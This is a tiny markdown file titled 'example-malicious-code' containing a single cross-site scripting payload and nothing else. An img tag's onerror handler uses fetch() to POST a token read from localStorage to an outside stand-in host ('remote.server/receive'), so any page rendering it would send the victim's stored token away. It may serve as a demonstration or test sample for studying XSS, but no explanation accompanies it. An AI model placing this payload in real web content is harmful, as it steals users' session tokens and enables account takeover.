# example-malicious-code

```
<img src onerror='fetch(\"https://remote.server/receive\", { method: \"POST\", headers: { \"Content-Type\": 
\"application/json\" }, body: JSON.stringify({ localStorageData: localStorage.getItem(\"RANDON_TOKEN\") }) 
});'></img>
```
